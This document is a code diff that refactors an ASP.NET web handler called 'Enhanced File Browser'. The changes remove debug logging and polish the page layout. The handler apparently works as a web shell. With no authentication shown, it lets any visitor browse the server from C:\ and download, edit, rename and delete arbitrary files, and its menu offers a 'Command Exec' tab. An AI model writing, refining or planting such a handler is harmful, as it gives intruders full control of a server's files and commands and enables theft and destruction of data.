@@ -1,13 +1,13 @@
-<%@ WebHandler Language="C#" Class="DebugEnhancedFileBrowser" %>
+<%@ WebHandler Language="C#" Class="EnhancedFileBrowser" %>
 using System;
 using System.Web;
 using System.IO;
 using System.Text;
 using System.Diagnostics;
 
-public class DebugEnhancedFileBrowser : IHttpHandler
+public class EnhancedFileBrowser : IHttpHandler
 {
-    private const string DefaultFolder = @"C:\"; // Replace with valid default directory on your server
+    private const string DefaultFolder = @"C:\"; // Default directory if no path supplied
 
     public void ProcessRequest(HttpContext context)
     {
@@ -16,29 +16,38 @@ public class DebugEnhancedFileBrowser : IHttpHandler
         string action = context.Request["action"];
         string requestedPath = context.Request["path"];
 
-        // Log incoming request parameters (for debugging)
-        Debug.WriteLine($"Action: {action}");
-        Debug.WriteLine($"Requested Path: {requestedPath}");
-
         string currentPath = ValidatePathOrDefault(requestedPath);
-        Debug.WriteLine($"Using path for browsing: {currentPath}");
 
         StringBuilder html = new StringBuilder();
-        html.Append("<html><head><title>Debug Enhanced File Browser</title>");
-        html.Append("<style>body{font-family:Segoe UI,sans-serif;} " +
-            "nav { margin-bottom: 20px; } " +
-            "nav a { margin-right: 15px; text-decoration:none; font-weight:bold; } " +
-            "table { border-collapse: collapse; width: 100%; } " +
-            "th, td {border: 1px solid #ccc; padding: 8px; text-align:left;} " +
-            "tr:hover {background-color: #f0f0f0;} " +
-            ".error{color:red;} .success{color:green;} " +
-            ".tab {display:none;} .tab.active{display:block;} " +
-            ".button {padding:5px 10px; margin:2px; cursor:pointer;} " +
-            "</style>");
+        html.Append("<html><head><title>Enhanced File Browser</title>");
+        html.Append(@"<style>
+            body{font-family:Segoe UI,sans-serif;}
+            nav { margin-bottom: 20px; }
+            nav a { margin-right: 15px; text-decoration:none; font-weight:bold; cursor:pointer;}
+            table { border-collapse: collapse; width: 100%; }
+            th, td {border: 1px solid #ccc; padding: 8px; text-align:left;}
+            tr:hover {background-color: #f0f0f0;}
+            .error{color:red;} .success{color:green;}
+            .tab {display:none;} .tab.active{display:block;}
+            .button {padding:5px 10px; margin:2px; cursor:pointer;}
+            ul.dir-list {list-style:none; padding-left:0; margin:0 0 1em 0;}
+            ul.dir-list li {margin:3px 0;}
+            a.back-link {
+                font-weight:bold;
+                display:inline-block;
+                margin-bottom:10px;
+                text-decoration:none;
+            }
+            a.back-link:hover {
+                text-decoration: underline;
+            }
+            </style>");
         html.Append(@"<script>
             function showTab(id) {
                 var tabs = document.getElementsByClassName('tab');
-                for(var i=0;i<tabs.length;i++) { tabs[i].classList.remove('active'); }
+                for(var i=0; i<tabs.length; i++) {
+                    tabs[i].classList.remove('active');
+                }
                 document.getElementById(id).classList.add('active');
             }
             function confirmDelete(path) {
@@ -57,10 +66,13 @@ public class DebugEnhancedFileBrowser : IHttpHandler
                 var url = '?action=editform&path=' + encodeURIComponent(path);
                 window.location.href = url;
             }
-            </script>");
+        </script>");
         html.Append("</head><body>");
-        html.Append("<nav><a href=\"javascript:void(0)\" onclick=\"showTab('browseTab')\">Browse Files</a> | ");
-        html.Append("<a href=\"javascript:void(0)\" onclick=\"showTab('cmdTab')\">Command Exec</a></nav>");
+
+        html.Append("<nav>");
+        html.Append("<a onclick=\"showTab('browseTab')\">Browse Files</a> | ");
+        html.Append("<a onclick=\"showTab('cmdTab')\">Command Exec</a>");
+        html.Append("</nav>");
 
         string message = PerformActions(context, action, currentPath, out currentPath);
         if (!string.IsNullOrEmpty(message))
@@ -83,20 +95,13 @@ public class DebugEnhancedFileBrowser : IHttpHandler
     private string ValidatePathOrDefault(string path)
     {
         if (string.IsNullOrWhiteSpace(path))
-        {
-            Debug.WriteLine("ValidatePathOrDefault: Empty path, returning default");
             return DefaultFolder;
-        }
         try
         {
             if (Directory.Exists(path)) return path;
             if (File.Exists(path)) return Path.GetDirectoryName(path);
         }
-        catch (Exception ex)
-        {
-            Debug.WriteLine("ValidatePathOrDefault error: " + ex.Message);
-        }
-        Debug.WriteLine("ValidatePathOrDefault: Invalid path, returning default");
+        catch { }
         return DefaultFolder;
     }
 
@@ -112,7 +117,8 @@ public class DebugEnhancedFileBrowser : IHttpHandler
                 case "delete":
                     {
                         string target = context.Request["path"];
-                        if (string.IsNullOrWhiteSpace(target)) return "<span class='error'>Delete failed: Path missing.</span>";
+                        if (string.IsNullOrWhiteSpace(target))
+                            return "<span class='error'>Delete failed: Path missing.</span>";
                         if (File.Exists(target))
                         {
                             File.Delete(target);
@@ -132,8 +138,10 @@ public class DebugEnhancedFileBrowser : IHttpHandler
                     {
                         string target = context.Request["path"];
                         string newName = context.Request["newname"];
-                        if (string.IsNullOrWhiteSpace(target)) return "<span class='error'>Rename failed: Path missing.</span>";
-                        if (string.IsNullOrWhiteSpace(newName)) return "<span class='error'>Rename failed: New name missing.</span>";
+                        if (string.IsNullOrWhiteSpace(target))
+                            return "<span class='error'>Rename failed: Path missing.</span>";
+                        if (string.IsNullOrWhiteSpace(newName))
+                            return "<span class='error'>Rename failed: New name missing.</span>";
                         string newFullPath = Path.Combine(Path.GetDirectoryName(target), newName);
                         if (File.Exists(target))
                         {
@@ -153,13 +161,12 @@ public class DebugEnhancedFileBrowser : IHttpHandler
                         }
                     }
                 case "editform":
-                    {
-                        return null;
-                    }
+                    return null; // handled in Render
                 case "saveedit":
                     {
                         string filePath = context.Request["path"];
-                        if (string.IsNullOrWhiteSpace(filePath)) return "<span class='error'>Save failed: Path missing.</span>";
+                        if (string.IsNullOrWhiteSpace(filePath))
+                            return "<span class='error'>Save failed: Path missing.</span>";
                         if (File.Exists(filePath))
                         {
                             string content = context.Request.Form["filecontent"];
@@ -175,7 +182,8 @@ public class DebugEnhancedFileBrowser : IHttpHandler
                 case "newfolder":
                     {
                         string folderName = context.Request["foldername"];
-                        if (string.IsNullOrWhiteSpace(folderName)) return "<span class='error'>Folder creation failed: Folder name missing.</span>";
+                        if (string.IsNullOrWhiteSpace(folderName))
+                            return "<span class='error'>Folder creation failed: Folder name missing.</span>";
                         string newDir = Path.Combine(currentPath, folderName);
                         if (!Directory.Exists(newDir))
                         {
@@ -200,6 +208,7 @@ public class DebugEnhancedFileBrowser : IHttpHandler
     {
         StringBuilder sb = new StringBuilder();
         sb.Append($"<h2>Browsing: {HttpUtility.HtmlEncode(path)}</h2>");
+
         sb.Append(@"<form method='get'>
             <input type='hidden' name='action' value='newfolder'/>
             <input type='hidden' name='path' value='" + HttpUtility.HtmlEncode(path) + @"'/>
@@ -210,39 +219,51 @@ public class DebugEnhancedFileBrowser : IHttpHandler
         var parent = Directory.GetParent(path);
         if (parent != null)
         {
-            sb.Append($"<a href='?path={HttpUtility.UrlEncode(parent.FullName)}'>.. (Parent Directory)</a><br/>");
+            sb.Append($"<a href='?path={HttpUtility.UrlEncode(parent.FullName)}' class='back-link'>&larr; Back to {HttpUtility.HtmlEncode(parent.FullName)}</a><br/><br/>");
+        }
+
+        string[] allDirs;
+        try { allDirs = Directory.GetDirectories(path); } catch { allDirs = new string[0]; }
+        if (allDirs.Length > 0)
+        {
+            sb.Append("<b>Directories:</b><ul class='dir-list'>");
+            foreach (var d in allDirs)
+            {
+                var di = new DirectoryInfo(d);
+                sb.Append($"<li><a href='?path={HttpUtility.UrlEncode(d)}'>{HttpUtility.HtmlEncode(di.Name)}</a></li>");
+            }
+            sb.Append("</ul><hr/>");
         }
 
         sb.Append("<table><thead><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr></thead><tbody>");
-
         try
         {
-            foreach (var dir in Directory.GetDirectories(path))
+            foreach (var d in allDirs)
             {
-                var dirInfo = new DirectoryInfo(dir);
+                var di = new DirectoryInfo(d);
                 sb.Append("<tr>");
-                sb.Append($"<td><b><a href='?path={HttpUtility.UrlEncode(dir)}'>{HttpUtility.HtmlEncode(dirInfo.Name)}</a></b></td>");
+                sb.Append($"<td><b><a href='?path={HttpUtility.UrlEncode(d)}'>{HttpUtility.HtmlEncode(di.Name)}</a></b></td>");
                 sb.Append("<td>--</td>");
-                sb.Append($"<td>{dirInfo.LastWriteTime}</td>");
+                sb.Append($"<td>{di.LastWriteTime}</td>");
                 sb.Append("<td>");
-                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(dir)}')\">Rename</button>");
-                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(dir)}')\">Delete</button>");
+                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(d)}')\">Rename</button>");
+                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(d)}')\">Delete</button>");
                 sb.Append("</td>");
                 sb.Append("</tr>");
             }
 
-            foreach (var file in Directory.GetFiles(path))
+            foreach (var f in Directory.GetFiles(path))
             {
-                var fileInfo = new FileInfo(file);
+                var fi = new FileInfo(f);
                 sb.Append("<tr>");
-                sb.Append($"<td><a href='?action=editform&path={HttpUtility.UrlEncode(file)}'>{HttpUtility.HtmlEncode(fileInfo.Name)}</a></td>");
-                sb.Append($"<td>{FormatSize(fileInfo.Length)}</td>");
-                sb.Append($"<td>{fileInfo.LastWriteTime}</td>");
+                sb.Append($"<td><a href='?action=editform&path={HttpUtility.UrlEncode(f)}'>{HttpUtility.HtmlEncode(fi.Name)}</a></td>");
+                sb.Append($"<td>{FormatSize(fi.Length)}</td>");
+                sb.Append($"<td>{fi.LastWriteTime}</td>");
                 sb.Append("<td>");
-                sb.Append($"<a class='button' href='?action=download&path={HttpUtility.UrlEncode(file)}'>Download</a>");
-                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(file)}')\">Rename</button>");
-                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(file)}')\">Delete</button>");
-                sb.Append($"<button class='button' onclick=\"editFile('{HttpUtility.JavaScriptStringEncode(file)}')\">Edit</button>");
+                sb.Append($"<a class='button' href='?action=download&path={HttpUtility.UrlEncode(f)}'>Download</a>");
+                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(f)}')\">Rename</button>");
+                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(f)}')\">Delete</button>");
+                sb.Append($"<button class='button' onclick=\"editFile('{HttpUtility.JavaScriptStringEncode(f)}')\">Edit</button>");
                 sb.Append("</td>");
                 sb.Append("</tr>");
             }
@@ -251,7 +272,6 @@ public class DebugEnhancedFileBrowser : IHttpHandler
         {
             sb.Append($"<tr><td colspan='4' class='error'>Error reading directory: {HttpUtility.HtmlEncode(ex.Message)}</td></tr>");
         }
-
         sb.Append("</tbody></table>");
 
         if (context.Request["action"] == "editform")
@@ -352,7 +372,7 @@ public class DebugEnhancedFileBrowser : IHttpHandler
             context.Response.TransmitFile(file);
             context.Response.Flush();
             context.Response.End();
-            return null; // won't reach here
+            return null; // will not reach here
         }
         catch (Exception ex)
         {
